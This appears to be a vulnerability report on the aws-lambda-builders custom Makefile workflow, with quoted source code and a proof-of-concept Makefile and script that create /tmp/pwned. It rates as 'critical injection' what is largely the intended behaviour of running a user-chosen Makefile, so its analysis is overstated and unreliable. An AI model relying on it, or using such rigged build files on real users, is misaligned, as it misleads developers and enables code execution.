### Vulnerability List

- Vulnerability Name: Command Injection in Custom Makefile Workflow
- Description:
    1. An attacker can create a malicious `Makefile` containing arbitrary commands.
    2. The user utilizes the `aws-lambda-builders` library with the custom Makefile workflow, specifying the path to the malicious `Makefile` as `manifest_path` and providing a `build_logical_id` that corresponds to a malicious target defined in the `Makefile`.
    3. When `LambdaBuilder.build` is executed, the `CustomMakeWorkflow` is triggered.
    4. The `CustomMakeAction` within the workflow executes the `make` command using `subprocess_make.run`.
    5. The `make` command is executed with arguments directly derived from user-controlled inputs: the path to the malicious `Makefile` (`self.manifest_path`) and the malicious target name (constructed using `self.build_logical_id`).
    6. The `make` utility processes the malicious `Makefile` and executes the attacker-injected commands on the user's system.

- Impact:
    - Arbitrary command execution on the user's system running `aws-lambda-builders`.
    - Full system compromise is possible if the attacker crafts a sophisticated payload.
    - Confidentiality, Integrity, and Availability of the user's system can be severely impacted.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - No input validation or sanitization is implemented for the `Makefile` content or the `build_logical_id` within the `aws-lambda-builders` project code itself (based on the provided files). The execution of `make` is performed without any apparent security measures to restrict its capabilities.

- Missing Mitigations:
    - Input sanitization: Implement robust input validation and sanitization for both the `Makefile` content and the `build_logical_id` to prevent the injection of malicious commands.
    - Sandboxing/Isolation: Execute the `make` process within a sandboxed or isolated environment with restricted privileges to limit the impact of command injection vulnerabilities.
    - Security Auditing: Conduct regular security audits of the custom Makefile workflow functionality to identify and address potential vulnerabilities.
    - Principle of Least Privilege: Avoid running the `make` process with elevated privileges.

- Preconditions:
    - The user must utilize the `aws-lambda-builders` library and choose the custom Makefile workflow for building Lambda functions.
    - The attacker needs to provide a malicious `Makefile` to the user, for example by convincing the user to download and use a compromised project or template.
    - The user must execute `aws-lambda-builders` with the malicious Makefile.

- Source Code Analysis:
    - File: `/code/aws_lambda_builders/workflows/custom_make/actions.py`
        ```python
        class CustomMakeAction(BaseAction):
            ...
            def execute(self):
                ...
                try:
                    current_env = self.osutils.environ()
                    current_env.update({"ARTIFACTS_DIR": self.artifact_dir_path})
                    self.subprocess_make.run(
                        [
                            "--makefile",
                            "{}".format(self.manifest_path),
                            "build-{logical_id}".format(logical_id=self.build_logical_id),
                        ],
                        env=current_env,
                        cwd=self.working_directory,
                    )
                except MakeExecutionError as ex:
                    raise ActionFailedError(str(ex))
        ```
        - The `CustomMakeAction.execute` method directly calls `self.subprocess_make.run` to execute the `make` command.
        - The arguments to `make` are constructed without sanitization, directly using `self.manifest_path` (user-provided Makefile path) and `self.build_logical_id` (user-provided target name).
        - The environment variable `ARTIFACTS_DIR` is set, but the primary vulnerability lies in the lack of control over the Makefile's content and target execution.

    - File: `/code/aws_lambda_builders/workflows/custom_make/make.py`
        ```python
        class SubProcessMake(object):
            ...
            def run(self, args, env=None, cwd=None):
                ...
                invoke_make = [self.make_exe] + args
                ...
                p = self.osutils.popen(invoke_make, stdout=self.osutils.pipe, stderr=self.osutils.pipe, cwd=cwd, env=env)
                ...
        ```
        - The `SubProcessMake.run` method uses `self.osutils.popen` to execute the `make` command.
        - The `popen` method directly executes the command without any sandboxing or input validation on the command arguments.

- Security Test Case:
    1. Create a file named `malicious_makefile` with the following content:
        ```makefile
        build-test_function:
            touch /tmp/pwned
        ```
    2. Create a temporary directory, e.g., `/tmp/test_vulnerability`.
    3. Save the `malicious_makefile` inside `/tmp/test_vulnerability`.
    4. Execute the following Python code:
        ```python
        import tempfile
        from aws_lambda_builders.builder import LambdaBuilder
        import os

        source_dir = "/tmp/test_vulnerability"
        artifacts_dir = tempfile.mkdtemp()
        scratch_dir = tempfile.mkdtemp()
        manifest_path = os.path.join(source_dir, "malicious_makefile")

        builder = LambdaBuilder(language="provided", dependency_manager=None, application_framework=None)

        try:
            builder.build(
                source_dir,
                artifacts_dir,
                scratch_dir,
                manifest_path,
                runtime="provided",
                options={"build_logical_id": "test_function"},
            )
        except Exception as e:
            print(f"Build failed as expected or encountered an error: {e}")
        finally:
            if os.path.exists("/tmp/pwned"):
                print("Vulnerability confirmed: /tmp/pwned file created.")
                os.remove("/tmp/pwned")
            else:
                print("Vulnerability check failed: /tmp/pwned file not found.")

            import shutil
            shutil.rmtree(artifacts_dir)
            shutil.rmtree(scratch_dir)
            shutil.rmtree(source_dir)
        ```
    5. Run the Python script.
    6. Check the output. If "Vulnerability confirmed: /tmp/pwned file created." is printed, the command injection vulnerability is validated.